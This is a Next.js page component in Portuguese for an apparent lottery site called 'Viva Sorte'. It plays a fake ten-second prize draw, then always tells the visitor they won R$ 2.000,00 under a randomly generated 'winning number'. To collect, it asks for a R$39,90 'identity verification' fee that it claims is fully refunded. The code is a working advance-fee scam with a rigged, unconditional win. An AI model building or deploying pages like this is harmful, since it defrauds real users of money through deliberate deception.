"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { ChevronDown } from "lucide-react"
import HeaderMenu from "@/components/header-menu"

export default function UpsellPage() {
  const router = useRouter()
  const [showCelebration, setShowCelebration] = useState(false)
  const [winningNumber, setWinningNumber] = useState("000.000")

  useEffect(() => {
    const randomNum = Math.floor(Math.random() * 1000000)
      .toString()
      .padStart(6, "0")
    const formatted = randomNum.slice(0, 3) + "." + randomNum.slice(3, 6)
    setWinningNumber(formatted)

    const timer = setTimeout(() => {
      setShowCelebration(true)
    }, 10000)

    return () => clearTimeout(timer)
  }, [])

  const handleVerificationClick = () => {
    router.push("/verification")
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <header className="bg-white p-3 sm:p-4 flex items-center justify-between border-b sticky top-0 z-10">
        <Image
          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/ODx1rLRAaDQT-aVUCbVbgZTqf4v0e275UDVm8V0hdRA.png"
          alt="Viva Sorte Logo"
          width={160}
          height={45}
          className="h-6 sm:h-10 w-auto"
        />
        <HeaderMenu />
      </header>

      <main className="flex-1 flex flex-col items-center justify-center px-3 sm:px-4 py-8 sm:py-12">
        <div className="w-full max-w-2xl">
          {!showCelebration ? (
            <div className="flex flex-col items-center justify-center py-12 sm:py-20">
              <div className="mb-8 sm:mb-12 relative">
                <img
                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-5jceS7jmP2NASAcs12cat7XVkWZgqB.png"
                  alt="Porco com Moedas"
                  width={200}
                  height={200}
                  className="w-48 h-48 sm:w-64 sm:h-64 animate-bounce"
                />
                <div className="absolute inset-0 flex items-center justify-center">
                  <div className="absolute w-12 h-12 bg-yellow-400 rounded-full animate-ping opacity-75 top-0 left-8"></div>
                  <div className="absolute w-10 h-10 bg-yellow-400 rounded-full animate-ping opacity-75 top-0 right-8 delay-100"></div>
                  <div className="absolute w-12 h-12 bg-yellow-400 rounded-full animate-ping opacity-75 bottom-12 left-4 delay-200"></div>
                  <div className="absolute w-10 h-10 bg-yellow-400 rounded-full animate-ping opacity-75 bottom-12 right-4 delay-150"></div>
                </div>
              </div>

              <div className="text-center">
                <h1 className="text-2xl sm:text-4xl font-bold text-gray-800 mb-2">Sorteando seu prêmio...</h1>
                <p className="text-gray-600 text-base sm:text-lg mb-6">
                  Aguarde alguns segundos enquanto verificamos seu resultado
                </p>

                <div className="flex justify-center gap-1 mb-8">
                  <div className="w-3 h-3 bg-blue-600 rounded-full animate-bounce"></div>
                  <div className="w-3 h-3 bg-blue-600 rounded-full animate-bounce delay-100"></div>
                  <div className="w-3 h-3 bg-blue-600 rounded-full animate-bounce delay-200"></div>
                </div>
              </div>
            </div>
          ) : (
            <div className="animate-fade-in">
              <div className="text-center mb-8">
                <div className="mb-4 text-5xl sm:text-6xl">🎉</div>
                <h1 className="text-2xl sm:text-4xl font-bold text-gray-800 mb-2">
                  Parabéns! Você acertou uma <span className="text-blue-600">COTA PREMIADA!</span>
                </h1>
              </div>

              <div className="mb-8 p-6 sm:p-8 bg-gradient-to-r from-blue-100 to-blue-50 rounded-2xl border-4 border-dashed border-blue-400">
                <p className="text-center text-gray-600 text-sm sm:text-base mb-3 font-semibold">
                  Seu número premiado:
                </p>
                <p className="text-center text-5xl sm:text-6xl font-black text-blue-600 tracking-wider">
                  {winningNumber}
                </p>
              </div>

              <div className="mb-8 p-6 sm:p-8 bg-blue-600 text-white rounded-2xl shadow-lg">
                <p className="text-center text-lg sm:text-xl font-semibold mb-2">Você ganhou</p>
                <p className="text-center text-4xl sm:text-5xl font-black mb-4">R$ 2.000,00</p>
                <p className="text-center text-sm sm:text-base opacity-90">
                  em sua <span className="font-bold">COTA PREMIADA</span>, basta clicar no botão abaixo.
                </p>
              </div>

              <div className="mb-8 p-4 sm:p-6 bg-yellow-50 border-2 border-yellow-300 rounded-xl">
                <p className="text-sm sm:text-base text-yellow-900">
                  <span className="font-bold">⚠️ Atenção:</span> Para garantir que o ganhador é uma pessoa real e não um
                  robô automatizado, é cobrada uma taxa simbólica de <span className="font-bold">R$39,90</span> como
                  verificação de identidade. Após a confirmação, o valor é{" "}
                  <span className="font-bold">totalmente reembolsado</span> junto com o prêmio.
                </p>
              </div>

              <Button
                onClick={handleVerificationClick}
                className="w-full h-14 sm:h-16 bg-blue-600 hover:bg-blue-700 text-white rounded-xl font-bold text-lg sm:text-xl shadow-lg hover:shadow-xl transition-all"
              >
                RECEBER R$ 2.000,00
              </Button>

              <div className="flex justify-center mt-8">
                <div className="animate-bounce">
                  <ChevronDown className="w-6 h-6 text-gray-400" />
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      <footer className="border-t border-gray-200 py-4 px-4 text-center text-xs sm:text-sm text-gray-600">
        <p>Comprar mais títulos aumenta suas chances de ganhar!</p>
      </footer>
    </div>
  )
}
